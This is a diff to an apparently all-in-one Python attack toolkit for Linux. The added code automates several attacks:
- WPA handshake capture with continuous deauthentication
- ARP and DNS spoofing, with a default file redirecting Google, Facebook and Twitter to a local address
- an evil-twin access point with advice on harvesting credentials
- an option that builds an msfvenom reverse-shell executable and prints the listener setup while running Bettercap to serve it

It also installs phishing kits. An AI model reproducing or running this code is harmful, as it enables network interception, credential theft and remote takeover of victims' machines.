@@ -119,10 +119,197 @@ if sys.platform != "linux" and sys.platform != "linux2":
     print("[!] This toolkit is only supported on Linux.")
     sys.exit(1)
 
+def check_and_prompt_dependencies():
+    """Check for required dependencies, list missing ones, and prompt user for installation options."""
+    print(f"{Colors.OKCYAN}[+] Dependency Checker{Colors.ENDC}")
+    
+    # Define all required tools
+    system_packages = [
+        "git", "curl", "wget", "python3", "python3-pip", "build-essential",
+        "libssl-dev", "libffi-dev", "python3-dev", "ruby", "ruby-dev",
+        "nodejs", "npm", "go", "rustc", "cargo"
+    ]
+    package_tools = [
+        "nmap", "hydra", "sqlmap", "gobuster", "arp-scan", "whois", "dig",
+        "aircrack-ng", "wifite", "reaver", "hcxdumptool", "hcxpcapngtool",
+        "ettercap", "bettercap", "dirb", "nikto", "whatweb", "theharvester",
+        "recon-ng", "maltego"
+    ]
+    python_tools = [
+        "setoolkit", "requests", "beautifulsoup4", "lxml", "selenium", "scapy",
+        "cryptography", "paramiko", "netaddr", "dnspython", "python-nmap",
+        "python-whois", "shodan", "censys", "virustotal-api", "haveibeenpwned",
+        "tweepy", "facebook-sdk", "linkedin-api", "instagram-scraper"
+]
+    github_tools = [
+        ("BlackEye", "/opt/BlackEye/blackeye.sh"),
+        ("SocialFish", "/opt/SocialFish/SocialFish.py"),
+        ("HiddenEye", "/opt/HiddenEye/HiddenEye.py"),
+        ("Wifiphisher", "/opt/wifiphisher/wifiphisher.py"),
+        ("Sherlock", "/opt/sherlock/sherlock.py"),
+        ("Photon", "/opt/Photon/photon.py"),
+        ("Subfinder", "/opt/subfinder/subfinder"),
+        ("Amass", "/opt/amass/amass"),
+        ("Nuclei", "/opt/nuclei/nuclei"),
+        ("httpx", "/opt/httpx/httpx"),
+        ("Naabu", "/opt/naabu/naabu"),
+        ("TheHarvester", "/opt/theHarvester/theHarvester.py"),
+        ("Recon-ng", "/opt/recon-ng/recon-ng"),
+        ("Maltego", "/opt/maltego-trx/maltego-trx"),
+    ]
+    
+    missing = []
+    # Check system/package tools
+    for tool in package_tools:
+        if shutil.which(tool) is None:
+            missing.append((tool, "system"))
+    # Check Python tools
+    for tool in python_tools:
+        try:
+            __import__(tool.replace('-', '_').replace('python-', '').replace('beautifulsoup4', 'bs4'))
+        except ImportError:
+            missing.append((tool, "python"))
+    # Check GitHub tools
+    for name, path in github_tools:
+        if not os.path.exists(path):
+            missing.append((name, "github"))
+    
+    if not missing:
+        print(f"{Colors.OKGREEN}[+] All dependencies are installed!{Colors.ENDC}")
+        return
+    
+    print(f"{Colors.FAIL}[!] Missing dependencies:{Colors.ENDC}")
+    
+    # Group missing dependencies by type
+    system_missing = [tool for tool, typ in missing if typ == "system"]
+    python_missing = [tool for tool, typ in missing if typ == "python"]
+    github_missing = [tool for tool, typ in missing if typ == "github"]
+    
+    # Display in table format with colored headers and missing tools
+    if system_missing or python_missing or github_missing:
+        # Calculate column widths (add 2 for padding)
+        system_width = max(len("System Tools"), *(len(tool) for tool in system_missing)) + 2 if system_missing else 0
+        python_width = max(len("Python Packages"), *(len(tool) for tool in python_missing)) + 2 if python_missing else 0
+        github_width = max(len("GitHub Tools"), *(len(tool) for tool in github_missing)) + 2 if github_missing else 0
+        
+        # Table header
+        header_line = "┌" + "─" * system_width + "┬" + "─" * python_width + "┬" + "─" * github_width + "┐"
+        print("  " + header_line)
+        
+        # Print column headers in yellow
+        headers = []
+        headers.append(f"│ {Colors.WARNING}{'System Tools':^{system_width-2}}{Colors.ENDC} ")
+        headers.append(f"│ {Colors.WARNING}{'Python Packages':^{python_width-2}}{Colors.ENDC} ")
+        headers.append(f"│ {Colors.WARNING}{'GitHub Tools':^{github_width-2}}{Colors.ENDC} │")
+        print("".join(headers))
+        
+        # Separator
+        separator = "├" + "─" * system_width + "┼" + "─" * python_width + "┼" + "─" * github_width + "┤"
+        print("  " + separator)
+        
+        # Print tools in rows, each tool in red, with padding
+        max_rows = max(len(system_missing), len(python_missing), len(github_missing))
+        for i in range(max_rows):
+            row = []
+            if i < len(system_missing):
+                row.append(f"│ {Colors.FAIL}{system_missing[i]:<{system_width-2}}{Colors.ENDC} ")
+            else:
+                row.append(f"│ {' ' * (system_width-1)}")
+            if i < len(python_missing):
+                row.append(f"│ {Colors.FAIL}{python_missing[i]:<{python_width-2}}{Colors.ENDC} ")
+            else:
+                row.append(f"│ {' ' * (python_width-1)}")
+            if i < len(github_missing):
+                row.append(f"│ {Colors.FAIL}{github_missing[i]:<{github_width-2}}{Colors.ENDC} │")
+            else:
+                row.append(f"│ {' ' * (github_width-1)}│")
+            print("".join(row))
+        
+        # Bottom border
+        bottom_line = "└" + "─" * system_width + "┴" + "─" * python_width + "┴" + "─" * github_width + "┘"
+        print("  " + bottom_line)
+    
+    print()
+    print(f"{Colors.WARNING}Options:{Colors.ENDC}")
+    print(f"  1. Install ALL missing dependencies")
+    print(f"  2. Select which to install")
+    print(f"  3. Skip installation (not recommended)")
+    choice = input(f"{Colors.OKBLUE}Choose an option [1/2/3]: {Colors.ENDC}").strip()
+    to_install = []
+    if choice == "1":
+        to_install = missing
+    elif choice == "2":
+        print(f"{Colors.OKCYAN}Enter numbers separated by comma (e.g. 1,3,5):{Colors.ENDC}")
+        for idx, (tool, typ) in enumerate(missing, 1):
+            print(f"  {idx}. {tool} ({typ})")
+        sel = input(f"{Colors.OKBLUE}Select: {Colors.ENDC}").strip()
+        try:
+            nums = [int(x) for x in sel.split(",") if x.strip().isdigit()]
+            to_install = [missing[i-1] for i in nums if 1 <= i <= len(missing)]
+        except Exception:
+            print(f"{Colors.FAIL}Invalid selection. Skipping installation.{Colors.ENDC}")
+            return
+    else:
+        print(f"{Colors.WARNING}Skipping dependency installation. Some tools may not work!{Colors.ENDC}")
+        return
+    # Install selected tools
+    for tool, typ in to_install:
+        print(f"{Colors.OKBLUE}[*] Installing {tool} ({typ})...{Colors.ENDC}")
+        if typ == "system":
+            subprocess.run(["sudo", "apt", "install", "-y", tool])
+        elif typ == "python":
+            subprocess.run([sys.executable, "-m", "pip", "install", tool])
+        elif typ == "github":
+            # Find repo URL for this tool (hardcoded for now)
+            repo_map = {
+                "BlackEye": "https://github.com/thelinuxchoice/blackeye.git",
+                "SocialFish": "https://github.com/UndeadSec/SocialFish.git",
+                "HiddenEye": "https://github.com/DarkSecDevelopers/HiddenEye.git",
+                "Wifiphisher": "https://github.com/wifiphisher/wifiphisher.git",
+                "Sherlock": "https://github.com/sherlock-project/sherlock.git",
+                "Photon": "https://github.com/s0md3v/Photon.git",
+                "Subfinder": "https://github.com/projectdiscovery/subfinder.git",
+                "Amass": "https://github.com/owasp-amass/amass.git",
+                "Nuclei": "https://github.com/projectdiscovery/nuclei.git",
+                "httpx": "https://github.com/projectdiscovery/httpx.git",
+                "Naabu": "https://github.com/projectdiscovery/naabu.git",
+                "TheHarvester": "https://github.com/laramies/theHarvester.git",
+                "Recon-ng": "https://github.com/lanmaster53/recon-ng.git",
+                "Maltego": "https://github.com/paterva/maltego-trx.git",
+            }
+            repo = repo_map.get(tool)
+            if repo:
+                subprocess.run(["sudo", "git", "clone", repo, f"/opt/{tool}"])
+            else:
+                print(f"{Colors.FAIL}No repo URL for {tool}. Please install manually.{Colors.ENDC}")
+    print(f"{Colors.OKGREEN}[+] Dependency installation complete!{Colors.ENDC}")
+
 def ensure_installed(cmd_name, install_cmd):
+    """Enhanced tool installation checker"""
     if shutil.which(cmd_name) is None:
-        print(f"[!] {cmd_name} not found. Installing...")
-        subprocess.run(["sudo", "apt", "install", "-y"] + install_cmd.split())
+        print(f"{Colors.WARNING}[!] {cmd_name} not found. Installing...{Colors.ENDC}")
+        
+        # Try different installation methods
+        install_methods = [
+            ["sudo", "apt", "install", "-y", install_cmd],
+            [sys.executable, "-m", "pip", "install", install_cmd],
+            ["sudo", "gem", "install", install_cmd],
+            ["go", "install", install_cmd],
+        ]
+        
+        for method in install_methods:
+            try:
+                result = subprocess.run(method, capture_output=True, text=True)
+                if result.returncode == 0:
+                    print(f"{Colors.OKGREEN}[+] {cmd_name} installed successfully!{Colors.ENDC}")
+                    return
+            except Exception:
+                continue
+        
+        print(f"{Colors.FAIL}[-] Failed to install {cmd_name}. Please install manually.{Colors.ENDC}")
+        return False
+    
+    return True
 
 def check_root():
     if os.geteuid() != 0:
@@ -142,55 +329,9 @@ def check_monitor_mode(iface):
         return False
     return True
 
-def auto_install_dependencies():
-    # List of required tools
-    tools = [
-        ("nmap", "nmap"),
-        ("hydra", "hydra"),
-        ("sqlmap", "sqlmap"),
-        ("gobuster", "gobuster"),
-        ("arp-scan", "arp-scan"),
-        ("whois", "whois"),
-        ("set", "set"),
-        ("sendmail", "sendmail"),
-        ("dig", "dnsutils"),
-        ("aircrack-ng", "aircrack-ng"),
-        ("wifite", "wifite"),
-        ("reaver", "reaver"),
-        ("hcxdumptool", "hcxdumptool"),
-        ("hcxpcapngtool", "hcxtools"),
-        ("ettercap", "ettercap-text-only"),
-        ("wifiphisher", "wifiphisher"),
-        ("bettercap", "bettercap"),
-    ]
-    for cmd, pkg in tools:
-        if shutil.which(cmd) is None:
-            print(f"[!] {cmd} not found. Installing {pkg}...")
-            subprocess.run(["sudo", "apt", "install", "-y", pkg])
-    # Download wordlists if missing
-    wordlists = {
-        "/usr/share/wordlists/rockyou.txt": "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt",
-        "/usr/share/wordlists/dirb/common.txt": "https://raw.githubusercontent.com/v0re/dirb/master/wordlists/common.txt",
-        "/usr/share/wordlists/subdomains-top1million-5000.txt": "https://raw.githubusercontent.com/assetnote/commonspeak2-wordlists/master/subdomains/subdomains-top1million-5000.txt"
-    }
-    for path, url in wordlists.items():
-        if not os.path.exists(path):
-            print(f"[!] Wordlist not found: {path}. Downloading...")
-            os.makedirs(os.path.dirname(path), exist_ok=True)
-            try:
-                r = requests.get(url)
-                with open(path, "wb") as f:
-                    f.write(r.content)
-                print(f"[+] Downloaded {path}")
-            except Exception as e:
-                print(f"[-] Failed to download {path}: {e}")
-
-# Logging results
-import datetime
-
 def log_result(name, data):
     with open(f"results_{name}.txt", "a") as f:
-        f.write(f"[{datetime.datetime.now().isoformat()}] {data}\n")
+        f.write(f"[{datetime.now().isoformat()}] {data}\n")
 
 # ARP Scan
 def arp_scan():
@@ -418,19 +559,84 @@ def phishing_page():
 
 # Port Scan (basic, using socket)
 def port_scan(ip):
-    try:
-        port_range = input("Port range (e.g. 20-1024, default 1-1024): ")
-        if '-' in port_range:
-            start, end = map(int, port_range.split('-'))
-        else:
-            start, end = 1, 1024
-    except Exception:
+    print(f"[+] Port Scan - Scanning {ip}")
+    print("[!] Choose scan type:")
+    print("1. Quick scan (common ports 1-1024)")
+    print("2. Full scan (all ports 1-65535)")
+    print("3. Custom range")
+    print("4. Common service ports only")
+    
+    choice = input("Select scan type (1-4, default 1): ").strip() or "1"
+    
+    if choice == "1":
         start, end = 1, 1024
+        print(f"[+] Quick scan: ports {start}-{end}")
+    elif choice == "2":
+        start, end = 1, 65535
+        print(f"[+] Full scan: ports {start}-{end} (this will take a while)")
+    elif choice == "3":
+        try:
+            port_range = input("Port range (e.g. 20-1024): ").strip()
+            if '-' in port_range:
+                start, end = map(int, port_range.split('-'))
+                if start < 1 or end > 65535 or start > end:
+                    print("[-] Invalid port range. Using 1-1024.")
+                    start, end = 1, 1024
+            else:
+                print("[-] Invalid format. Using 1-1024.")
+                start, end = 1, 1024
+        except Exception:
+            print("[-] Invalid input. Using 1-1024.")
+            start, end = 1, 1024
+    elif choice == "4":
+        # Common service ports
+        common_ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 993, 995, 1723, 3306, 3389, 5900, 8080]
+        print(f"[+] Common service scan: {len(common_ports)} ports")
+        open_ports = []
+        for port in common_ports:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(1.0)
+            try:
+                s.connect((ip, port))
+                banner = ""
+                try:
+                    s.sendall(b'\r\n')
+                    banner = s.recv(1024).decode(errors='ignore').strip()
+                except:
+                    pass
+                service = get_service_name(port)
+                print(f"[OPEN] Port {port} ({service}) {'- ' + banner if banner else ''}")
+                open_ports.append(f"{port} {service} {banner}")
+                log_result("portscan", f"{ip}:{port} {service} OPEN {banner}")
+            except:
+                pass
+            finally:
+                s.close()
+        
+        if not open_ports:
+            print("[!] No open ports found.")
+        else:
+            print(f"[+] Found {len(open_ports)} open ports.")
+        return
+    else:
+        print("[-] Invalid choice. Using quick scan.")
+        start, end = 1, 1024
+    
     print(f"[+] Scanning ports {start}-{end} on {ip}")
+    print("[*] This may take a while...")
+    
     open_ports = []
-    for port in range(start, end+1):
+    total_ports = end - start + 1
+    scanned = 0
+    
+    for port in range(start, end + 1):
+        scanned += 1
+        if scanned % 100 == 0:
+            progress = (scanned / total_ports) * 100
+            print(f"[*] Progress: {progress:.1f}% ({scanned}/{total_ports})")
+        
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(0.3)
+        s.settimeout(0.5)
         try:
             s.connect((ip, port))
             banner = ""
@@ -439,14 +645,29 @@ def port_scan(ip):
                 banner = s.recv(1024).decode(errors='ignore').strip()
             except:
                 pass
-            print(f"[OPEN] Port {port} {'- ' + banner if banner else ''}")
-            open_ports.append(f"{port} {banner}")
-            log_result("portscan", f"{ip}:{port} OPEN {banner}")
+            service = get_service_name(port)
+            print(f"[OPEN] Port {port} ({service}) {'- ' + banner if banner else ''}")
+            open_ports.append(f"{port} {service} {banner}")
+            log_result("portscan", f"{ip}:{port} {service} OPEN {banner}")
         except:
             pass
-        s.close()
+        finally:
+            s.close()
+    
     if not open_ports:
         print("[!] No open ports found in range.")
+    else:
+        print(f"[+] Found {len(open_ports)} open ports.")
+
+def get_service_name(port):
+    """Get common service name for port"""
+    services = {
+        21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS", 80: "HTTP",
+        110: "POP3", 111: "RPC", 135: "RPC", 139: "NetBIOS", 143: "IMAP",
+        443: "HTTPS", 993: "IMAPS", 995: "POP3S", 1723: "PPTP", 3306: "MySQL",
+        3389: "RDP", 5900: "VNC", 8080: "HTTP-Proxy"
+    }
+    return services.get(port, "Unknown")
 
 # Whois Lookup
 def whois_lookup(domain):
@@ -709,52 +930,136 @@ def wifi_handshake_capture():
     if not check_root():
         print("[-] Root privileges required.")
         return
+    
+    # Get interface
     iface = input("Wireless interface (e.g. wlan0): ").strip()
-    if not check_monitor_mode(iface):
-        print(f"[-] {iface} is not in monitor mode. Use: sudo airmon-ng start {iface}")
+    if not iface:
+        print("[-] Interface name required.")
         return
+    
+    # Check if aircrack-ng tools are available
     if shutil.which("airodump-ng") is None:
         print("[-] airodump-ng not found. Please install aircrack-ng suite.")
         return
+    
+    # Get target details
     bssid = input("Target BSSID (AP MAC): ").strip()
+    if not bssid or len(bssid.split(':')) != 6:
+        print("[-] Invalid BSSID format. Use format: AA:BB:CC:DD:EE:FF")
+        return
+    
     channel = input("Channel: ").strip()
+    try:
+        channel = int(channel)
+        if channel < 1 or channel > 14:
+            print("[-] Invalid channel. Use 1-14 for 2.4GHz.")
+            return
+    except ValueError:
+        print("[-] Invalid channel number.")
+        return
+    
     out_file = input("Output file prefix (default: handshake): ").strip() or "handshake"
+    
+    # Handle monitor mode
     mon_iface = iface
     if not iface.endswith("mon"):
-        mon_iface = iface + "mon"
         print("[*] Enabling monitor mode...")
-        subprocess.run(["sudo", "airmon-ng", "start", iface])
+        try:
+            # Try different monitor mode naming conventions
+            result = subprocess.run(["sudo", "airmon-ng", "start", iface], capture_output=True, text=True)
+            if result.returncode == 0:
+                # Check what interface name was created
+                if f"{iface}mon" in result.stdout:
+                    mon_iface = f"{iface}mon"
+                elif f"{iface}_mon" in result.stdout:
+                    mon_iface = f"{iface}_mon"
+                else:
+                    # Try to find the monitor interface
+                    iw_output = subprocess.getoutput("iwconfig")
+                    for line in iw_output.split('\n'):
+                        if iface in line and "Mode:Monitor" in line:
+                            mon_iface = line.split()[0]
+                            break
+                    if mon_iface == iface:
+                        print(f"[!] Could not determine monitor interface name. Using {iface}")
+            else:
+                print(f"[-] Failed to enable monitor mode: {result.stderr}")
+                return
+        except Exception as e:
+            print(f"[-] Error enabling monitor mode: {e}")
+            return
+    
     print(f"[*] Using monitor interface: {mon_iface}")
-    print("[*] Capturing handshake. Press Ctrl+C when done.")
+    
+    # Ask if user wants to deauth clients
+    deauth = input("Send deauth packets to force handshake? (y/N): ").strip().lower() == 'y'
+    
+    if deauth:
+        print("[*] Starting deauth attack in background...")
+        try:
+            deauth_proc = subprocess.Popen(["sudo", "aireplay-ng", "--deauth", "0", "-a", bssid, mon_iface])
+        except Exception as e:
+            print(f"[-] Failed to start deauth: {e}")
+            deauth_proc = None
+    
+    print("[*] Starting handshake capture. Press Ctrl+C when done.")
+    print("[*] Look for 'WPA handshake' message in the output.")
+    
     try:
-        proc = subprocess.Popen(["sudo", "airodump-ng", "-c", channel, "--bssid", bssid, "-w", out_file, mon_iface], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
-        if proc.stdout is not None:
-            for line in proc.stdout:
-                print(line, end='')
+        # Run airodump-ng without capturing stdout to see live output
+        proc = subprocess.Popen(["sudo", "airodump-ng", "-c", str(channel), "--bssid", bssid, "-w", out_file, mon_iface])
         proc.wait()
     except KeyboardInterrupt:
         print("[!] Capture stopped.")
-    subprocess.run(["sudo", "airmon-ng", "stop", mon_iface])
-    # Detect the actual .cap file name
-    cap_file = f"{out_file}-01.cap"
-    if os.path.exists(cap_file) and os.path.getsize(cap_file) > 0:
-        print(f"[+] Handshake capture file: {cap_file}")
-        # Check for handshake presence
-        if shutil.which("aircrack-ng"):
-            print("[*] Checking for handshake in capture file...")
+        if 'deauth_proc' in locals() and deauth_proc:
+            deauth_proc.terminate()
+    except Exception as e:
+        print(f"[-] airodump-ng failed: {e}")
+        if 'deauth_proc' in locals() and deauth_proc:
+            deauth_proc.terminate()
+    
+    # Stop monitor mode
+    try:
+        subprocess.run(["sudo", "airmon-ng", "stop", mon_iface])
+    except Exception as e:
+        print(f"[!] Warning: Could not stop monitor mode: {e}")
+    
+    # Check for capture files
+    cap_files = []
+    for i in range(1, 10):  # Check for multiple files
+        test_file = f"{out_file}-{i:02d}.cap"
+        if os.path.exists(test_file) and os.path.getsize(test_file) > 0:
+            cap_files.append(test_file)
+    
+    if cap_files:
+        print(f"[+] Found capture files: {', '.join(cap_files)}")
+        
+        # Check for handshake in each file
+        handshake_found = False
+        for cap_file in cap_files:
+            print(f"[*] Checking {cap_file} for handshake...")
             try:
-                result = subprocess.run(["aircrack-ng", "-a2", "-w", "/dev/null", cap_file], capture_output=True, text=True)
-                print(result.stdout)
+                result = subprocess.run(["aircrack-ng", "-a2", "-w", "/dev/null", cap_file], 
+                                      capture_output=True, text=True, timeout=30)
                 if "1 handshake" in result.stdout or "handshake(s)" in result.stdout:
                     print(f"[+] Handshake(s) detected in {cap_file}!")
+                    handshake_found = True
+                    break
                 else:
-                    print(f"[-] No handshake detected in {cap_file}. Try recapturing or deauthing a client.")
+                    print(f"[-] No handshake in {cap_file}")
+            except subprocess.TimeoutExpired:
+                print(f"[-] Timeout checking {cap_file}")
             except Exception as e:
-                print(f"[-] Error running aircrack-ng for handshake check: {e}")
-        else:
-            print("[!] aircrack-ng not found. Cannot check for handshake presence.")
+                print(f"[-] Error checking {cap_file}: {e}")
+        
+        if not handshake_found:
+            print("[!] No handshake found. Try:")
+            print("  1. Wait for a client to connect")
+            print("  2. Use deauth attack to force reconnection")
+            print("  3. Check if the AP is actually WPA/WPA2")
     else:
-        print(f"[-] Handshake file {cap_file} not found or empty. Capture may have failed.")
+        print(f"[-] No capture files found. Check if {out_file}-*.cap exists.")
+    
     input("\n[Press Enter to return to the menu]")
 
 def wifi_crack_handshake():
@@ -996,9 +1301,10 @@ def generate_msfvenom_payload():
 def bettercap_menu():
     menu_text = """
 [Bettercap MITM]
-1. Start Bettercap CLI (WiFi/Ethernet)
+1. Start Bettercap CLI (WiFi/Ethernet) - Live Terminal
 2. Start Bettercap Web UI (remote control)
-3. Show Bettercap credential log
+3. Bettercap + msfvenom Payload Integration
+4. Show Bettercap credential log
 0. Back
 """
     while True:
@@ -1007,22 +1313,48 @@ def bettercap_menu():
         if choice == "1":
             ensure_installed("bettercap", "bettercap")
             iface = input("Interface (e.g. wlan0mon or eth0): ").strip()
+            if not iface:
+                print("[-] Interface required.")
+                continue
+                
+            # Enable IP forwarding for MITM
+            print("[*] Enabling IP forwarding...")
+            subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"])
+            
             channel = input("WiFi Channel (optional, press Enter to skip): ").strip()
-            caplet = input("Bettercap caplet (e.g. wifi-ap, wifi-recon, press Enter for default): ").strip()
+            caplet = input("Bettercap caplet (e.g. wifi-ap, http-req-dump, net.sniff, press Enter for default): ").strip()
+            
+            print("[!] Bettercap will run in live terminal mode.")
             print("[!] To harvest credentials, use caplets like 'wifi-ap', 'http-req-dump', or 'net.sniff'.")
+            print("[!] Press Ctrl+C to stop bettercap.")
+            
             cmd = ["sudo", "bettercap", "-iface", iface]
             if channel:
                 cmd += ["-eval", f"wifi.channel {channel}"]
             if caplet:
                 cmd += ["-caplet", caplet]
+            
             print(f"[+] Running: {' '.join(cmd)}")
+            print("[*] Bettercap is starting... (this may take a moment)")
+            
             try:
-                subprocess.run(cmd)
+                # Run bettercap in live terminal mode
+                proc = subprocess.Popen(cmd)
+                proc.wait()
+            except KeyboardInterrupt:
+                print("[!] Bettercap stopped.")
+                if 'proc' in locals():
+                    proc.terminate()
             except Exception as e:
                 print(f"[-] Bettercap failed: {e}")
+                
         elif choice == "2":
             ensure_installed("bettercap", "bettercap")
             iface = input("Interface (e.g. wlan0mon or eth0): ").strip()
+            if not iface:
+                print("[-] Interface required.")
+                continue
+                
             print("[+] Launching Bettercap Web UI on http://127.0.0.1:8083 (default password: bettercap)")
             print("[!] In your browser, go to http://127.0.0.1:8083 and login.")
             print("[!] For remote access, forward port 8083 or use SSH tunneling.")
@@ -1030,7 +1362,78 @@ def bettercap_menu():
                 subprocess.run(["sudo", "bettercap", "-iface", iface, "-caplet", "http-ui"])
             except Exception as e:
                 print(f"[-] Bettercap Web UI failed: {e}")
+                
         elif choice == "3":
+            ensure_installed("bettercap", "bettercap")
+            if shutil.which("msfvenom") is None:
+                print("[-] msfvenom not found. Please install Metasploit Framework.")
+                continue
+                
+            iface = input("Interface (e.g. wlan0mon or eth0): ").strip()
+            if not iface:
+                print("[-] Interface required.")
+                continue
+                
+            print("[+] Bettercap + msfvenom Integration")
+            print("[!] This will start bettercap for MITM and generate msfvenom payloads.")
+            
+            # Generate msfvenom payload
+            print("\n[*] Generating msfvenom payload...")
+            payload_type = input("Payload type (windows/meterpreter/reverse_tcp, linux/x86/shell_reverse_tcp, etc.): ").strip()
+            if not payload_type:
+                payload_type = "windows/meterpreter/reverse_tcp"
+                
+            lhost = input("Your IP (LHOST): ").strip()
+            if not lhost:
+                print("[-] LHOST required for msfvenom.")
+                continue
+                
+            lport = input("Port (LPORT, default 4444): ").strip() or "4444"
+            
+            output_file = f"payload_{payload_type.replace('/', '_')}.exe"
+            
+            print(f"[*] Generating {payload_type} payload...")
+            try:
+                msf_cmd = ["msfvenom", "-p", payload_type, f"LHOST={lhost}", f"LPORT={lport}", "-f", "exe", "-o", output_file]
+                print(f"[+] Running: {' '.join(msf_cmd)}")
+                subprocess.run(msf_cmd)
+                
+                if os.path.exists(output_file):
+                    print(f"[+] Payload saved as: {output_file}")
+                    print(f"[+] Start listener with: msfconsole -r -")
+                    print(f"[+] In msfconsole, run: use exploit/multi/handler")
+                    print(f"[+] Set: set PAYLOAD {payload_type}")
+                    print(f"[+] Set: set LHOST {lhost}")
+                    print(f"[+] Set: set LPORT {lport}")
+                    print(f"[+] Run: exploit")
+                else:
+                    print("[-] Payload generation failed.")
+                    continue
+                    
+            except Exception as e:
+                print(f"[-] msfvenom failed: {e}")
+                continue
+                
+            # Start bettercap
+            print("\n[*] Starting Bettercap for MITM...")
+            print("[!] Use bettercap to redirect traffic or serve the payload.")
+            
+            # Enable IP forwarding
+            subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"])
+            
+            try:
+                cmd = ["sudo", "bettercap", "-iface", iface, "-caplet", "http-req-dump"]
+                print(f"[+] Running: {' '.join(cmd)}")
+                proc = subprocess.Popen(cmd)
+                proc.wait()
+            except KeyboardInterrupt:
+                print("[!] Bettercap stopped.")
+                if 'proc' in locals():
+                    proc.terminate()
+            except Exception as e:
+                print(f"[-] Bettercap failed: {e}")
+                
+        elif choice == "4":
             log_path = os.path.expanduser("~/.bettercap/logs/creds.log")
             if os.path.exists(log_path):
                 print(f"[+] Showing credentials from {log_path}:")
@@ -1134,23 +1537,85 @@ def http_sniff_and_harvest():
 
 def arp_spoof():
     ensure_installed("arpspoof", "dsniff")
+    if not check_root():
+        print("[-] Root privileges required for ARP spoofing.")
+        return
+        
     iface = input("Network interface (e.g. eth0): ").strip()
+    if not iface:
+        print("[-] Interface required.")
+        return
+        
     target = input("Target IP (victim): ").strip()
+    if not target:
+        print("[-] Target IP required.")
+        return
+        
     gateway = input("Gateway IP (router): ").strip()
-    print("[!] You may need to enable IP forwarding: sudo sysctl -w net.ipv4.ip_forward=1")
-    print(f"[+] Running: sudo arpspoof -i {iface} -t {target} {gateway}")
+    if not gateway:
+        print("[-] Gateway IP required.")
+        return
+    
+    print("[*] Enabling IP forwarding for MITM...")
+    subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"])
+    
+    print(f"[+] Starting ARP spoofing attack...")
+    print(f"[+] Target: {target} | Gateway: {gateway} | Interface: {iface}")
+    print("[!] This will poison ARP tables. Press Ctrl+C to stop.")
+    
     try:
-        subprocess.run(["sudo", "arpspoof", "-i", iface, "-t", target, gateway])
+        # Start arpspoof in live mode
+        cmd = ["sudo", "arpspoof", "-i", iface, "-t", target, gateway]
+        print(f"[+] Running: {' '.join(cmd)}")
+        proc = subprocess.Popen(cmd)
+        proc.wait()
+    except KeyboardInterrupt:
+        print("[!] ARP spoofing stopped.")
+        if 'proc' in locals():
+            proc.terminate()
     except Exception as e:
         print(f"[-] arpspoof failed: {e}")
 
 def dns_spoof():
     ensure_installed("dnsspoof", "dsniff")
+    if not check_root():
+        print("[-] Root privileges required for DNS spoofing.")
+        return
+        
     iface = input("Network interface (e.g. eth0): ").strip()
-    hosts_file = input("Hosts file (e.g. /tmp/dnshosts): ").strip()
-    print(f"[+] Running: sudo dnsspoof -i {iface} -f {hosts_file}")
+    if not iface:
+        print("[-] Interface required.")
+        return
+        
+    # Create a default hosts file if none provided
+    hosts_file = input("Hosts file (press Enter for default): ").strip()
+    if not hosts_file:
+        hosts_file = "/tmp/dnshosts"
+        # Create a sample hosts file
+        with open(hosts_file, "w") as f:
+            f.write("192.168.1.100 google.com\n")
+            f.write("192.168.1.100 facebook.com\n")
+            f.write("192.168.1.100 twitter.com\n")
+        print(f"[*] Created default hosts file: {hosts_file}")
+        print("[*] Edit this file to customize DNS spoofing targets.")
+    
+    if not os.path.exists(hosts_file):
+        print(f"[-] Hosts file {hosts_file} not found.")
+        return
+    
+    print(f"[+] Starting DNS spoofing...")
+    print(f"[+] Interface: {iface} | Hosts file: {hosts_file}")
+    print("[!] This will intercept DNS queries. Press Ctrl+C to stop.")
+    
     try:
-        subprocess.run(["sudo", "dnsspoof", "-i", iface, "-f", hosts_file])
+        cmd = ["sudo", "dnsspoof", "-i", iface, "-f", hosts_file]
+        print(f"[+] Running: {' '.join(cmd)}")
+        proc = subprocess.Popen(cmd)
+        proc.wait()
+    except KeyboardInterrupt:
+        print("[!] DNS spoofing stopped.")
+        if 'proc' in locals():
+            proc.terminate()
     except Exception as e:
         print(f"[-] dnsspoof failed: {e}")
 
@@ -1213,41 +1678,119 @@ def log_wifi_mitm_result(data):
 
 def evil_twin_ap():
     ensure_installed("airbase-ng", "aircrack-ng")
+    if not check_root():
+        print("[-] Root privileges required for Evil Twin attack.")
+        return
+        
     iface = input("Wireless interface in monitor mode (e.g. wlan0mon): ").strip()
+    if not iface:
+        print("[-] Interface required.")
+        return
+        
+    if not check_monitor_mode(iface):
+        print(f"[-] {iface} is not in monitor mode. Use: sudo airmon-ng start {iface}")
+        return
+        
     ssid = input("SSID to clone (target network name): ").strip()
+    if not ssid:
+        print("[-] SSID required.")
+        return
+        
     channel = input("Channel (default 6): ").strip() or "6"
-    print("[!] This will create a fake AP with the same SSID. Clients may connect if deauthed from the real AP.")
-    print(f"[+] Running: sudo airbase-ng -e '{ssid}' -c {channel} {iface}")
-    log_wifi_mitm_result(f"Evil Twin AP started: SSID={ssid}, channel={channel}, iface={iface}")
-    print("[!] For credential harvesting, run Wireshark or tcpdump on the at0 interface created by airbase-ng.")
+    
+    print("[!] This will create a fake AP with the same SSID.")
+    print("[!] Clients may connect if deauthed from the real AP.")
+    print("[!] For credential harvesting, run Wireshark or tcpdump on the at0 interface.")
     print("[!] Example: sudo wireshark -i at0 or sudo tcpdump -i at0 -w wifi_mitm.pcap")
-    print("[!] After capturing, use Wireshark's 'Follow TCP Stream' and search for login/password fields.")
+    
+    log_wifi_mitm_result(f"Evil Twin AP started: SSID={ssid}, channel={channel}, iface={iface}")
+    
     try:
-        subprocess.run(["sudo", "airbase-ng", "-e", ssid, "-c", channel, iface])
+        cmd = ["sudo", "airbase-ng", "-e", ssid, "-c", channel, iface]
+        print(f"[+] Running: {' '.join(cmd)}")
+        print("[*] Evil Twin AP starting... Press Ctrl+C to stop.")
+        
+        proc = subprocess.Popen(cmd)
+        proc.wait()
+    except KeyboardInterrupt:
